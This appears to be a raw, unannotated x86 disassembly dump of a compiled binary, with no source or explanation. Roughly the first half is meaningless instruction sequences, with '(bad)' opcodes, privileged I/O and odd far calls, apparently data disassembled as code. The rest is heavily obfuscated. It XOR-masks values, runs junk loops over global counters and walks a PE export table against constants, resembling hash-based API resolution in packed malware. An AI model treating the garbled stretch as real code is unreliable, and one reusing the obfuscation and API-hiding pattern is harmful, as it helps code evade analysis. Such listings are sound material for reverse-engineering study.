  4080a3:	call   0x86d2:0x49fd1410
  4080aa:	pop    ebx
  4080ab:	cmc    
  4080ac:	and    esp,DWORD PTR [ecx+ecx*1-0x2923bc82]
  4080b3:	mov    dh,0xf3
  4080b5:	mov    edi,0x1ab48a45
  4080ba:	jge    0x408053
  4080bc:	adc    esi,DWORD PTR [edi+0x63]
  4080bf:	stc    
  4080c0:	arpl   bx,cx
  4080c2:	imul   DWORD PTR [edx-0x7f]
  4080c5:	mov    esi,0x16d1e093
  4080ca:	jne    0x4080e8
  4080cc:	add    al,0x6f
  4080ce:	inc    eax
  4080cf:	shl    DWORD PTR [ebx-0xf],0xb1
  4080d3:	in     eax,0xc7
  4080d5:	sti    
  4080d6:	mov    bh,0xb5
  4080d8:	dec    ebp
  4080d9:	mov    WORD PTR [eax],ds
  4080db:	and    eax,0xddfc37b9
  4080e0:	adc    BYTE PTR [esi-0x596fac43],bh
  4080e6:	int3   
  4080e7:	mov    ah,0xbd
  4080e9:	pop    edx
  4080ea:	sahf   
  4080eb:	sbb    edi,DWORD PTR [ecx+0x1]
  4080ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080ef:	jnp    0x408152
  4080f1:	cld    
  4080f2:	mov    eax,0x10e29475
  4080f7:	retf   0xa9b4
  4080fa:	dec    edi
  4080fb:	mov    edi,0x30953a4
  408100:	ja     0x408127
  408102:	fisubr WORD PTR [ebx-0x60]
  408105:	out    0xf8,al
  408107:	hlt    
  408108:	retf   0x9a7b
  40810b:	push   0xffffffb9
  40810d:	sub    DWORD PTR gs:[ecx+esi*4+0x54],edi
  408112:	loope  0x408152
  408114:	dec    esi
  408115:	in     eax,0xfc
  408117:	shl    DWORD PTR [edi],cl
  408119:	aad    0xaf
  40811b:	data16 jecxz 0x40818f
  40811e:	iret   
  40811f:	mov    esp,0x9db218b3
  408124:	push   edx
  408125:	mov    edi,0xa0378897
  40812a:	ds pop es
  40812c:	into   
  40812d:	daa    
  40812e:	push   ds
  40812f:	scas   al,BYTE PTR es:[edi]
  408130:	xchg   BYTE PTR [ecx+ebx*8+0x3],al
  408134:	or     eax,0xd1a883b9
  408139:	xor    ah,BYTE PTR [esi-0x45]
  40813c:	nop
  40813d:	jo     0x408193
  40813f:	test   eax,0x91f10aa8
  408144:	add    al,0x2
  408146:	daa    
  408147:	cwde   
  408148:	aaa    
  408149:	add    al,0x37
  40814b:	imul   eax,esp,0xffffffee
  40814e:	add    ah,BYTE PTR [eax+0x78]
  408151:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408152:	mov    ds:0x6a5528c2,al
  408157:	out    dx,eax
  408158:	in     eax,0xd8
  40815a:	xchg   esp,eax
  40815b:	in     al,dx
  40815c:	and    al,bl
  40815e:	dec    ebx
  40815f:	push   eax
  408160:	daa    
  408161:	test   bl,dh
  408163:	xor    ebx,ebp
  408165:	sub    BYTE PTR [edi-0x1cda3655],ch
  40816b:	push   0xb158c692
  408170:	cli    
  408171:	sbb    eax,0x731309e9
  408176:	cmp    eax,0x9afc6019
  40817b:	fwait
  40817c:	push   edx
  40817d:	mov    ebp,ebx
  40817f:	dec    esp
  408180:	sbb    ch,BYTE PTR [ebx-0xb46eec0]
  408186:	push   ecx
  408187:	xor    al,BYTE PTR [edi+0x0]
  40818a:	mov    eax,0x5341f24e
  40818f:	mov    ebp,eax
  408191:	cs push ebx
  408193:	lods   eax,DWORD PTR ds:[esi]
  408194:	or     eax,0x7adfc81a
  408199:	aas    
  40819a:	sbb    al,0xf2
  40819c:	bound  esp,QWORD PTR [eax+0x76]
  40819f:	add    DWORD PTR [esi],edi
  4081a1:	ins    BYTE PTR es:[edi],dx
  4081a2:	es cs stos BYTE PTR es:[edi],al
  4081a5:	mov    WORD PTR [ecx],cs
  4081a7:	data16 add al,0x92
  4081aa:	div    ch
  4081ac:	iret   
  4081ad:	jo     0x4081bb
  4081af:	jb     0x408197
  4081b1:	pop    es
  4081b2:	dec    DWORD PTR [eax]
  4081b4:	mov    ebp,0xce0434a2
  4081b9:	fcomp  DWORD PTR [esi]
  4081bb:	retf   
  4081bc:	sub    edi,DWORD PTR [esi-0x48]
  4081bf:	mov    ebx,0xea386032
  4081c4:	push   es
  4081c5:	sbb    BYTE PTR [edx],bl
  4081c7:	ins    BYTE PTR es:[edi],dx
  4081c8:	cmp    DWORD PTR [edi-0x52],0xfffffff3
  4081cc:	xchg   BYTE PTR [esi-0x6f999ec1],ch
  4081d2:	ja     0x408165
  4081d4:	pop    esp
  4081d5:	rcr    BYTE PTR [eax+ebx*4],0x52
  4081d9:	dec    esi
  4081da:	nop
  4081db:	fistp  WORD PTR [eax]
  4081dd:	mov    dl,0x5e
  4081df:	and    al,BYTE PTR [eax+ecx*1-0x72]
  4081e3:	dec    edx
  4081e4:	push   ss
  4081e5:	cmp    BYTE PTR [ebp+0x36c92f61],ch
  4081eb:	rcl    BYTE PTR [edx+ebx*2],cl
  4081ee:	jmp    0x408240
  4081f0:	pop    ss
  4081f1:	imul   DWORD PTR [edx]
  4081f3:	jnp    0x408247
  4081f5:	jnp    0x4081fc
  4081f7:	jae    0x408199
  4081f9:	inc    eax
  4081fa:	in     al,0x55
  4081fc:	xor    al,0x2
  4081fe:	and    eax,0xf6c87e01
  408203:	push   edi
  408204:	dec    eax
  408205:	pop    es
  408206:	icebp  
  408207:	push   cs
  408208:	push   edx
  408209:	or     BYTE PTR [eax],al
  40820b:	pusha  
  40820c:	in     al,0xa9
  40820e:	mov    ds:0x5ffeade2,al
  408213:	cdq    
  408214:	inc    ebx
  408215:	adc    BYTE PTR [edx-0x25],bh
  408218:	shl    DWORD PTR [ebp+0x7e569f58],0x48
  40821f:	inc    edx
  408220:	and    eax,eax
  408222:	dec    ebp
  408223:	aas    
  408224:	(bad)  
  408225:	mov    ebp,0x7f56e581
  40822a:	imul   DWORD PTR [edx]
  40822c:	add    eax,0x4c704f4d
  408231:	mov    ch,0xd5
  408233:	ret    0xe825
  408236:	mov    dh,BYTE PTR [ebp+0x30]
  408239:	retf   
  40823a:	inc    esp
  40823b:	inc    esi
  40823c:	inc    esi
  40823d:	push   ebx
  40823e:	xchg   ebp,eax
  40823f:	lahf   
  408240:	xor    ah,BYTE PTR ds:0x3866b168
  408246:	cmp    DWORD PTR [ecx-0x48],ecx
  408249:	xor    al,BYTE PTR [esi-0x76b683bf]
  40824f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408250:	add    bl,BYTE PTR [edx+0x1dc25fac]
  408256:	mov    DWORD PTR [ebx],ebx
  408258:	outs   dx,BYTE PTR ds:[esi]
  408259:	sub    BYTE PTR [eax+0x5d],dl
  40825c:	sub    edi,eax
  40825e:	jle    0x408210
  408260:	dec    ecx
  408261:	repnz addr16 cli 
  408264:	mov    edi,0x55e79972
  408269:	fidivr WORD PTR [esi-0x433efd74]
  40826f:	jl     0x4082d2
  408271:	pop    ds
  408272:	xchg   edi,eax
  408273:	pop    ds
  408274:	mov    bl,0xe8
  408276:	jle    0x408236
  408278:	adc    BYTE PTR [edx-0x63],al
  40827b:	or     DWORD PTR [edi],ecx
  40827d:	mov    BYTE PTR [esi],al
  40827f:	es push esp
  408281:	stc    
  408282:	aas    
  408283:	sub    DWORD PTR [edi],esi
  408285:	arpl   WORD PTR [edx-0x4e4a005c],ax
  40828b:	sbb    BYTE PTR [ecx+0x6c26ec59],0x53
  408292:	call   0xed153ed
  408297:	(bad)  
  408298:	mov    ah,0x24
  40829a:	mov    fs,WORD PTR ds:0x64403460
  4082a0:	xchg   ecx,eax
  4082a1:	rcl    BYTE PTR [ebp-0x6e225d75],1
  4082a7:	inc    ecx
  4082a8:	sub    eax,0x4da4eb4f
  4082ad:	icebp  
  4082ae:	xor    edi,DWORD PTR [edx+0x3ef10df8]
  4082b4:	jb     0x40832f
  4082b6:	fidivr DWORD PTR [edi]
  4082b8:	rcl    DWORD PTR [ebx-0xe],1
  4082bb:	call   0x99a1:0x819eba79
  4082c2:	leave  
  4082c3:	pop    ebp
  4082c4:	pop    ss
  4082c5:	bound  eax,QWORD PTR [eax-0x1ced2418]
  4082cb:	test   BYTE PTR [esi-0x6d6e784],ah
  4082d1:	stos   DWORD PTR es:[edi],eax
  4082d2:	nop
  4082d3:	das    
  4082d4:	icebp  
  4082d5:	lods   eax,DWORD PTR ds:[esi]
  4082d6:	sbb    al,0xce
  4082d8:	and    ebp,DWORD PTR ds:0x41ec968
  4082de:	out    dx,al
  4082df:	mov    ds,WORD PTR [ebp-0xd424b8e]
  4082e5:	mov    ds:0xb34a546a,al
  4082ea:	call   0x6a4bbcd5
  4082ef:	arpl   bp,sp
  4082f1:	xor    bl,cl
  4082f3:	mov    ebp,0x9370674c
  4082f8:	(bad)  
  4082f9:	call   0x99e43d57
  4082fe:	or     ebx,DWORD PTR [edi+0x4b673105]
  408304:	jnp    0x408316
  408306:	iret   
  408307:	push   ss
  408308:	push   ebx
  408309:	cmp    ch,cl
  40830b:	enter  0xa81f,0x61
  40830f:	mov    eax,0x1c6a1c27
  408314:	or     eax,0xfb46ef70
  408319:	add    DWORD PTR [edx],edi
  40831b:	adc    BYTE PTR [eax-0x6c59b23e],bh
  408321:	mov    bh,BYTE PTR [edx-0x4d86412b]
  408327:	or     ah,BYTE PTR [ebx-0x354edbff]
  40832d:	or     eax,esp
  40832f:	mov    dh,BYTE PTR [ecx-0x3]
  408332:	fdivrp st(6),st
  408334:	js     0x408366
  408336:	adc    ch,BYTE PTR [eax-0x50]
  408339:	mov    ds:0xbf05d807,al
  40833e:	lea    edi,[ebx]
  408340:	add    BYTE PTR [esi+esi*4],bh
  408343:	dec    edi
  408344:	into   
  408345:	push   edx
  408346:	add    al,0x85
  408348:	bound  edx,QWORD PTR [eax-0x7f]
  40834b:	cwde   
  40834c:	sahf   
  40834d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40834e:	cmp    DWORD PTR [edx-0x1ed04c21],ebp
  408354:	aam    0xe2
  408356:	repnz gs push cx
  40835a:	test   al,0xe9
  40835c:	ret    
  40835d:	inc    ebx
  40835e:	sbb    ah,0x91
  408361:	push   ds
  408362:	lahf   
  408363:	js     0x4082f1
  408365:	adc    eax,0x203af090
  40836a:	mov    ?,WORD PTR [ebx+0x5e2fa43f]
  408370:	mov    edx,DWORD PTR [edi+0x6]
  408373:	(bad)  
  408374:	fistp  DWORD PTR [edx-0x7dbe7210]
  40837a:	or     BYTE PTR ds:0xdd3a67d7,cl
  408380:	mov    WORD PTR [ecx+edi*8],?
  408383:	ds dec edi
  408385:	js     0x40830d
  408387:	push   edx
  408388:	inc    eax
  408389:	es push esp
  40838b:	es dec eax
  40838d:	repnz xchg ebp,eax
  40838f:	sti    
  408390:	sub    cl,ah
  408392:	mov    al,0x55
  408394:	leave  
  408395:	cmp    DWORD PTR [ebx-0x43f669a9],edx
  40839b:	sub    al,0xf7
  40839d:	mov    ecx,0x8b533ea4
  4083a2:	inc    esp
  4083a3:	adc    dh,BYTE PTR [edi-0x51]
  4083a6:	cmp    dl,BYTE PTR [edi+esi*1]
  4083a9:	mov    ds:0x4f2a9792,al
  4083ae:	dec    ebp
  4083af:	pop    eax
  4083b0:	shl    DWORD PTR ss:[esp+eax*2],0x7d
  4083b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083b6:	repnz jecxz 0x4083b7
  4083b9:	fwait
  4083ba:	shl    ch,1
  4083bc:	jecxz  0x4083e6
  4083be:	ret    
  4083bf:	in     al,0x1
  4083c1:	pop    es
  4083c2:	cmp    DWORD PTR [esi],eax
  4083c4:	dec    edi
  4083c5:	dec    esi
  4083c6:	push   edi
  4083c7:	daa    
  4083c8:	sub    DWORD PTR [ecx],0xa95d2dbb
  4083ce:	add    eax,0xec54ff70
  4083d3:	idiv   BYTE PTR [esi-0x35]
  4083d6:	sub    BYTE PTR [ebp-0x4096bab3],ah
  4083dc:	push   edx
  4083dd:	lods   eax,DWORD PTR ds:[esi]
  4083de:	xchg   ebp,eax
  4083df:	imul   ecx,DWORD PTR [bx+si],0x8df1cc6f
  4083e6:	imul   ebp,DWORD PTR [edi-0x6e7eabb3],0x61d33d9f
  4083f0:	data16 in al,0x3f
  4083f3:	cmp    bl,BYTE PTR [edi]
  4083f5:	int3   
  4083f6:	leave  
  4083f7:	iret   
  4083f8:	sub    esi,0x5d
  4083fb:	mov    ebp,0x2e64da0a
  408400:	les    ecx,FWORD PTR [eax-0x75c6b058]
  408406:	mov    edi,0xa1d7197f
  40840b:	int3   
  40840c:	ss aaa 
  40840e:	jge    0x408469
  408410:	lods   eax,DWORD PTR ds:[esi]
  408411:	fcmovb st,st(3)
  408413:	int3   
  408414:	xchg   ebp,eax
  408415:	mov    al,0xa3
  408417:	mov    eax,ds:0xd344c278
  40841c:	daa    
  40841d:	out    dx,al
  40841e:	xor    BYTE PTR [ebx-0x64],al
  408421:	sub    BYTE PTR [edx],ah
  408423:	inc    ecx
  408424:	mov    edx,0x177ffe9f
  408429:	enter  0x608f,0x36
  40842d:	cmp    al,0x94
  40842f:	shl    BYTE PTR [ecx],cl
  408431:	jns    0x40841e
  408433:	enter  0x8f11,0xc5
  408437:	inc    edx
  408438:	push   es
  408439:	sub    cl,0xb5
  40843c:	ret    
  40843d:	in     eax,dx
  40843e:	sub    edx,ebp
  408440:	int3   
  408441:	int3   
  408442:	push   ecx
  408443:	mov    BYTE PTR [ecx-0x1c],0x2f
  408447:	fidiv  DWORD PTR [eax]
  408449:	adc    al,0xe
  40844b:	mov    al,BYTE PTR [ebp+0x57]
  40844e:	xchg   BYTE PTR [ebx-0x57],al
  408451:	repnz in al,dx
  408453:	retf   0x1a06
  408456:	lahf   
  408457:	adc    eax,eax
  408459:	dec    edi
  40845a:	push   ds
  40845b:	loope  0x4083e4
  40845d:	fs pop ax
  408460:	inc    edx
  408461:	es jne 0x4084b6
  408464:	jmp    0x408447
  408466:	xchg   DWORD PTR [esi+0x10048aa4],ecx
  40846c:	mov    BYTE PTR [ebp-0x1],al
  40846f:	mov    eax,DWORD PTR [ebp-0x30]
  408472:	mov    edx,DWORD PTR [ebp-0xc]
  408475:	xor    eax,esi
  408477:	add    eax,edi
  408479:	imul   eax,edx
  40847c:	mov    edx,DWORD PTR [ebp-0x28]
  40847f:	xor    edx,esi
  408481:	add    eax,edx
  408483:	mov    edx,DWORD PTR [ebp-0x8]
  408486:	movzx  eax,BYTE PTR [eax+edx*1+0x3272fa]
  40848e:	mov    edx,DWORD PTR [ebp-0x50]
  408491:	xor    edx,esi
  408493:	lea    eax,[edx+eax*1+0x3272fa]
  40849a:	movzx  edx,BYTE PTR [ebp-0x1]
  40849e:	xor    edx,eax
  4084a0:	mov    BYTE PTR [ebp-0x1],dl
  4084a3:	mov    al,BYTE PTR [ebp-0x1]
  4084a6:	mov    edx,DWORD PTR [ebp-0x30]
  4084a9:	mov    ebx,DWORD PTR [ebp-0xc]
  4084ac:	xor    edx,esi
  4084ae:	add    edx,edi
  4084b0:	imul   edx,ebx
  4084b3:	mov    ebx,DWORD PTR [ebp-0x8]
  4084b6:	mov    BYTE PTR [edx+ebx*1],al
  4084b9:	mov    eax,DWORD PTR [ebp-0x40]
  4084bc:	mov    edx,DWORD PTR [ebp-0x28]
  4084bf:	xor    eax,esi
  4084c1:	xor    edx,esi
  4084c3:	add    eax,edi
  4084c5:	add    edx,edi
  4084c7:	imul   eax,edx
  4084ca:	add    eax,DWORD PTR [ebp-0xc]
  4084cd:	mov    DWORD PTR [ebp-0xc],eax
  4084d0:	mov    eax,DWORD PTR [ebp-0xc]
  4084d3:	mov    edx,DWORD PTR [ebp-0x18]
  4084d6:	cmp    edx,eax
  4084d8:	jb     0x406053
  4084de:	mov    eax,DWORD PTR [ebp-0x28]
  4084e1:	mov    edx,DWORD PTR [ebp-0x18]
  4084e4:	xor    eax,esi
  4084e6:	add    eax,edi
  4084e8:	imul   eax,edx
  4084eb:	mov    edx,DWORD PTR [ebp-0x1c]
  4084ee:	xor    edx,esi
  4084f0:	add    edx,edi
  4084f2:	or     eax,edx
  4084f4:	mov    edx,DWORD PTR [ebp-0x20]
  4084f7:	xor    edx,esi
  4084f9:	add    eax,edx
  4084fb:	mov    edx,DWORD PTR [ebp-0x20]
  4084fe:	xor    edx,esi
  408500:	add    eax,edx
  408502:	mov    edx,DWORD PTR [ebp-0x10]
  408505:	lea    eax,[eax+edx*1+0x64e5f4]
  40850c:	jmp    0x408520
  408511:	mov    eax,DWORD PTR [ebp-0x20]
  408514:	mov    edx,DWORD PTR [ebp-0x10]
  408517:	xor    eax,esi
  408519:	lea    eax,[eax+edx*1+0x3272fa]
  408520:	mov    DWORD PTR [ebp-0x10],eax
  408523:	jmp    0x405fa0
  408528:	mov    ebx,DWORD PTR [ebp-0x3c]
  40852b:	mov    eax,DWORD PTR [ebp+0xc]
  40852e:	xor    eax,esi
  408530:	lea    ecx,[ecx+eax*1+0x3272fa]
  408537:	lea    eax,[ecx-0x3272fa]
  40853d:	xor    eax,esi
  40853f:	cmp    eax,0xf89c95b5
  408544:	jne    0x403bac
  40854a:	dec    DWORD PTR [ebp-0x34]
  40854d:	jne    0x403ba0
  408553:	mov    eax,DWORD PTR [ebp+0x8]
  408556:	mov    ecx,DWORD PTR [ebp+0xc]
  408559:	mov    edx,DWORD PTR [ebp+0x8]
  40855c:	xor    ecx,esi
  40855e:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272fa]
  408565:	xor    eax,esi
  408567:	mov    al,BYTE PTR [eax+ebx*1+0x3272fa]
  40856e:	xor    edx,esi
  408570:	mov    BYTE PTR [edx+ebx*1+0x3272fa],cl
  408577:	mov    ecx,DWORD PTR [ebp+0xc]
  40857a:	xor    ecx,esi
  40857c:	mov    BYTE PTR [ecx+ebx*1+0x3272fa],al
  408583:	mov    eax,DWORD PTR [ebp+0xc]
  408586:	xor    eax,esi
  408588:	add    eax,edi
  40858a:	pop    edi
  40858b:	pop    esi
  40858c:	pop    ebx
  40858d:	leave  
  40858e:	ret    0x8
  408591:	xor    eax,eax
  408593:	ret    
  408594:	push   ebp
  408595:	mov    ebp,esp
  408597:	sub    esp,0x38
  40859a:	and    DWORD PTR ds:0x426ebd,0x0
  4085a4:	mov    eax,ds:0x426ebd
  4085a9:	inc    eax
  4085aa:	mov    ds:0x426ebd,eax
  4085af:	cmp    DWORD PTR ds:0x426ebd,0x1d
  4085b6:	jg     0x4085e2
  4085bc:	jmp    0x4085d5
  4085c1:	push   DWORD PTR [ebp-0x10]
  4085c4:	push   0x2f91
  4085c9:	push   DWORD PTR [ebp-0x20]
  4085cc:	push   DWORD PTR [ebp-0x1c]
  4085cf:	call   DWORD PTR ds:0x42fa1c
  4085d5:	cmp    DWORD PTR ds:0x426ebd,0x1c
  4085dc:	jb     0x4085a4
  4085e2:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  4085e9:	sbb    DWORD PTR ds:0x426f19,ecx
  4085ef:	push   ebx
  4085f0:	add    DWORD PTR ds:0x426f15,edx
  4085f6:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  4085fd:	xor    DWORD PTR ds:0x426e91,0x301b
  408607:	mov    eax,DWORD PTR [ebp-0x4]
  40860a:	xor    DWORD PTR ds:0x426f2d,0x2f12
  408614:	push   esi
  408615:	sbb    DWORD PTR ds:0x426ed9,edi
  40861b:	mov    esi,0x75108b3
  408620:	or     DWORD PTR ds:0x426eb9,0x50e3
  40862a:	xor    eax,esi
  40862c:	adc    DWORD PTR ds:0x426ecd,0x426e99
  408636:	push   edi
  408637:	mov    edi,0x3272fa
  40863c:	or     DWORD PTR ds:0x426ea1,0x426e81
  408646:	add    eax,edi
  408648:	and    DWORD PTR ds:0x426f29,0x7053
  408652:	mov    DWORD PTR [ebp-0x1c],eax
  408655:	mov    eax,DWORD PTR [ebp+0x14]
  408658:	test   eax,eax
  40865a:	mov    DWORD PTR ds:0x426f09,0x1147
  408664:	je     0x408688
  40866a:	mov    eax,ds:0x426ec5
  40866f:	and    eax,DWORD PTR ds:0x426e89
  408675:	mov    ds:0x426ec5,eax
  40867a:	mov    eax,DWORD PTR [ebp+0x14]
  40867d:	adc    ebx,0x54d7
  408683:	mov    eax,DWORD PTR [eax]
  408685:	mov    DWORD PTR [ebp-0x1c],eax
  408688:	mov    eax,DWORD PTR [ebp-0x4]
  40868b:	and    DWORD PTR ds:0x426ea1,0x0
  408695:	mov    ebx,DWORD PTR ds:0x426ea1
  40869b:	inc    ebx
  40869c:	mov    DWORD PTR ds:0x426ea1,ebx
  4086a2:	cmp    DWORD PTR ds:0x426ea1,0x9
  4086a9:	ja     0x4086e9
  4086af:	jmp    0x4086c2
  4086b4:	push   0x426e8d
  4086b9:	push   DWORD PTR [ebp-0x14]
  4086bc:	call   DWORD PTR ds:0x42fa48
  4086c2:	cmp    DWORD PTR ds:0x426ea1,0x8
  4086c9:	jne    0x4086dc
  4086cf:	mov    ebx,DWORD PTR ds:0x426ea1
  4086d5:	inc    ebx
  4086d6:	mov    DWORD PTR ds:0x426ea1,ebx
  4086dc:	cmp    DWORD PTR ds:0x426ea1,0x1e
  4086e3:	jb     0x408695
  4086e9:	xor    eax,esi
  4086eb:	sbb    ebx,DWORD PTR ds:0x426e85
  4086f1:	add    eax,edi
  4086f3:	mov    DWORD PTR [ebp-0x8],eax
  4086f6:	mov    eax,ds:0x426e85
  4086fb:	sub    DWORD PTR ds:0x426ed9,eax
  408701:	mov    eax,DWORD PTR [ebp-0xc]
  408704:	xor    eax,esi
  408706:	and    DWORD PTR ds:0x426edd,ecx
  40870c:	add    eax,edi
  40870e:	mov    DWORD PTR [ebp-0x24],eax
  408711:	mov    eax,DWORD PTR [ebp-0x4]
  408714:	xor    eax,esi
  408716:	and    DWORD PTR ds:0x426eb1,0x0
  408720:	jmp    0x408734
  408725:	xor    ebx,ebx
  408727:	or     ebx,DWORD PTR ds:0x426eb1
  40872d:	inc    ebx
  40872e:	mov    DWORD PTR ds:0x426eb1,ebx
  408734:	cmp    DWORD PTR ds:0x426eb1,0x15
  40873b:	jae    0x40878a
  408741:	cmp    DWORD PTR ds:0x426eb1,0x4
  408748:	ja     0x40878a
  40874e:	jmp    0x40876b
  408753:	push   0x3639
  408758:	push   0x1bb0
  40875d:	push   DWORD PTR [ebp-0x10]
  408760:	push   0x5fa6
  408765:	call   DWORD PTR ds:0x42fa4c
  40876b:	cmp    DWORD PTR ds:0x426eb1,0x3
  408772:	jne    0x408785
  408778:	mov    ebx,DWORD PTR ds:0x426eb1
  40877e:	inc    ebx
  40877f:	mov    DWORD PTR ds:0x426eb1,ebx
  408785:	jmp    0x408725
  40878a:	add    eax,edi
  40878c:	movzx  ebx,BYTE PTR ds:0x426f15
  408793:	sub    DWORD PTR ds:0x426ea1,ebx
  408799:	mov    DWORD PTR [ebp-0x30],eax
  40879c:	sub    eax,eax
  40879e:	mov    ebx,DWORD PTR [ebp-0x4]
  4087a1:	not    eax
  4087a3:	xor    ebx,esi
  4087a5:	add    ebx,edi
  4087a7:	sbb    eax,0xd90
  4087ac:	mov    eax,DWORD PTR [ebp-0x24]
  4087af:	dec    DWORD PTR ds:0x426ea9
  4087b5:	sub    eax,edi
  4087b7:	lea    ecx,[ebx-0x3272fa]
  4087bd:	sbb    DWORD PTR ds:0x426f29,0x78a2
  4087c7:	xor    eax,esi
  4087c9:	add    DWORD PTR ds:0x426ec9,0x4dad
  4087d3:	xor    ecx,esi
  4087d5:	cmp    ecx,eax
  4087d7:	mov    DWORD PTR ds:0x426ef5,0x6961
  4087e1:	je     0x408aae
  4087e7:	add    DWORD PTR ds:0x426f01,0x426f15
  4087f1:	mov    eax,DWORD PTR [ebp-0x4]
  4087f4:	sub    DWORD PTR ds:0x426e81,0x820
  4087fe:	xor    eax,esi
  408800:	add    eax,edi
  408802:	mov    DWORD PTR ds:0x426eb1,0x301a
  40880c:	cmp    ebx,eax
  40880e:	mov    DWORD PTR ds:0x426ee5,0x6594
  408818:	jne    0x408a65
  40881e:	push   DWORD PTR [ebp+0x8]
  408821:	sub    DWORD PTR ds:0x426ee9,0x426f19
  40882b:	call   0x41d4a8
  408830:	mov    DWORD PTR [ebp-0x14],eax
  408833:	sub    DWORD PTR ds:0x426f15,edx
  408839:	mov    eax,DWORD PTR [ebp-0x4]
  40883c:	and    ecx,0x4a39
  408842:	mov    ecx,DWORD PTR [ebp-0x14]
  408845:	xor    eax,esi
  408847:	sub    DWORD PTR ds:0x426eb5,0x426f0d
  408851:	add    eax,edi
  408853:	cmp    ecx,eax
  408855:	je     0x40aece
  40885b:	adc    DWORD PTR ds:0x426f25,0x56c1
  408865:	push   DWORD PTR [ebp-0x14]
  408868:	and    DWORD PTR ds:0x426f29,0x426f11
  408872:	push   DWORD PTR [ebp+0x8]
  408875:	and    DWORD PTR ds:0x426ed1,0x426ef9
  40887f:	call   0x41f8dc
  408884:	and    ecx,0xfc3
  40888a:	mov    DWORD PTR [ebp-0x14],eax
  40888d:	mov    DWORD PTR ds:0x426f09,0x15
  408897:	cmp    DWORD PTR ds:0x426f09,0x0
  40889e:	je     0x4088e4
  4088a4:	cmp    DWORD PTR ds:0x426f09,0x9
  4088ab:	ja     0x4088e4
  4088b1:	jmp    0x4088bc
  4088b6:	call   DWORD PTR ds:0x42fa20
  4088bc:	cmp    DWORD PTR ds:0x426f09,0xa
  4088c3:	jne    0x4088d4
  4088c9:	mov    eax,ds:0x426f09
  4088ce:	dec    eax
  4088cf:	mov    ds:0x426f09,eax
  4088d4:	mov    eax,ds:0x426f09
  4088d9:	dec    eax
  4088da:	mov    ds:0x426f09,eax
  4088df:	jmp    0x408897
  4088e4:	mov    eax,DWORD PTR [ebp-0x4]
  4088e7:	mov    ecx,DWORD PTR [ebp-0x14]
  4088ea:	add    DWORD PTR ds:0x426f01,0x32f5
  4088f4:	xor    eax,esi
  4088f6:	sub    DWORD PTR ds:0x426f11,0x426ec1
  408900:	add    eax,edi
  408902:	mov    DWORD PTR ds:0x426e81,0x73a8
  40890c:	cmp    ecx,eax
  40890e:	mov    DWORD PTR ds:0x426e81,0x4555
  408918:	je     0x40aece
  40891e:	mov    eax,DWORD PTR [ebp-0x14]
  408921:	mov    eax,DWORD PTR [eax+0x18]
  408924:	xor    DWORD PTR ds:0x426edd,0x1983
  40892e:	mov    DWORD PTR [ebp-0x24],eax
  408931:	adc    eax,ecx
  408933:	mov    eax,DWORD PTR [ebp-0x14]
  408936:	and    DWORD PTR ds:0x426f2d,0x0
  408940:	jmp    0x408952
  408945:	mov    ecx,DWORD PTR ds:0x426f2d
  40894b:	inc    ecx
  40894c:	mov    DWORD PTR ds:0x426f2d,ecx
  408952:	cmp    DWORD PTR ds:0x426f2d,0x12
  408959:	jae    0x4089a4
  40895f:	cmp    DWORD PTR ds:0x426f2d,0x5
  408966:	jbe    0x4089a4
  40896c:	jmp    0x408985
  408971:	push   0x426099
  408976:	push   DWORD PTR [ebp-0x28]
  408979:	push   DWORD PTR [ebp-0x1c]
  40897c:	push   DWORD PTR [ebp-0x10]
  40897f:	call   DWORD PTR ds:0x42fa24
  408985:	cmp    DWORD PTR ds:0x426f2d,0x4
  40898c:	jne    0x40899f
  408992:	mov    ecx,DWORD PTR ds:0x426f2d
  408998:	inc    ecx
  408999:	mov    DWORD PTR ds:0x426f2d,ecx
  40899f:	jmp    0x408945
  4089a4:	mov    ecx,DWORD PTR [ebp+0x8]
  4089a7:	add    ecx,DWORD PTR [eax+0x20]
  4089aa:	and    DWORD PTR ds:0x426efd,0x4f65
  4089b4:	mov    DWORD PTR [ebp-0x2c],ecx
  4089b7:	mov    eax,DWORD PTR [ebp-0x14]
  4089ba:	dec    DWORD PTR ds:0x426ed9
  4089c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4089c3:	and    DWORD PTR ds:0x426ef1,0x27b6
  4089cd:	add    ecx,DWORD PTR [eax+0x24]
  4089d0:	and    DWORD PTR ds:0x426f11,0x472e
  4089da:	mov    DWORD PTR [ebp-0x34],ecx
  4089dd:	mov    DWORD PTR ds:0x426f05,0x15
  4089e7:	cmp    DWORD PTR ds:0x426f05,0x0
  4089ee:	je     0x408a3a
  4089f4:	cmp    DWORD PTR ds:0x426f05,0x6
  4089fb:	jle    0x408a3a
  408a01:	jmp    0x408a0f
  408a06:	push   DWORD PTR [ebp-0x28]
  408a09:	call   DWORD PTR ds:0x42fa28
  408a0f:	cmp    DWORD PTR ds:0x426f05,0x7
  408a16:	jne    0x408a2a
  408a1c:	xor    eax,eax
  408a1e:	xor    eax,DWORD PTR ds:0x426f05
  408a24:	dec    eax
  408a25:	mov    ds:0x426f05,eax
  408a2a:	mov    eax,ds:0x426f05
  408a2f:	dec    eax
  408a30:	mov    ds:0x426f05,eax
  408a35:	jmp    0x4089e7
  408a3a:	mov    eax,DWORD PTR [ebp-0x14]
  408a3d:	or     ecx,0x6017
  408a43:	mov    ecx,DWORD PTR [ebp+0x8]
  408a46:	sbb    DWORD PTR ds:0x426e9d,0x426f29
  408a50:	add    ecx,DWORD PTR [eax+0x1c]
  408a53:	mov    DWORD PTR ds:0x426e89,0x71b1
  408a5d:	mov    DWORD PTR [ebp-0x14],ecx
  408a60:	jmp    0x408ae1
  408a65:	mov    ecx,DWORD PTR ds:0x426ee1
  408a6b:	or     DWORD PTR ds:0x426f29,ecx
  408a71:	mov    eax,DWORD PTR [ebp-0x2c]
  408a74:	mov    ecx,DWORD PTR [ebp+0x8]
  408a77:	add    ecx,DWORD PTR [eax+ebx*4]
  408a7a:	add    eax,DWORD PTR ds:0x426f11
  408a80:	mov    DWORD PTR [ebp-0x28],ecx
  408a83:	mov    eax,DWORD PTR [ebp-0x4]
  408a86:	mov    ecx,DWORD PTR [ebp-0x28]
